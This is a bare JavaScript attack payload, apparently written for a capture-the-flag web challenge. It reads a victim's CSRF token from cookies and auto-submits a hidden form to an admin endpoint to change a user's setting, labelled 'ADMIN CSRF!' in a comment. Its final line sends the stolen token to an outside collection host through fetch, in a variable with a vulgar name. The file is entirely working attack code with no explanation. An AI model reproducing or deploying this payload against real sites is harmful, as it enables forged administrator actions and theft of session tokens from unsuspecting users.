function getCookie(name) {
    let matches = document.cookie.match(new RegExp(
        "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
    ));
    return matches ? decodeURIComponent(matches[1]) : undefined;
}

// Создаём форму с токеном
let form = document.createElement('form');
form.action = 'https://tetris-g82i3vc.blzh.fr/admin/line-mode/user/c323d3ef-4b0d-4cfc-8d3a-2e05d051ed1f';
form.method = 'POST';

let input1 = document.createElement('input');
input1.type = 'hidden';
input1.name = 'line_mode';
input1.value = '1';
form.appendChild(input1);

let input2 = document.createElement('input');
input2.type = 'hidden';
input2.name = 'csrf_token';
input2.value = getCookie('csrf_token') || '';  // ADMIN CSRF!
form.appendChild(input2);

document.body.appendChild(form);
form.submit();

let pizda = getCookie('csrf_token') || '';
fetch('http://g82i3vc.isgood.host:9517/csrf.html?pizda='+pizda) 
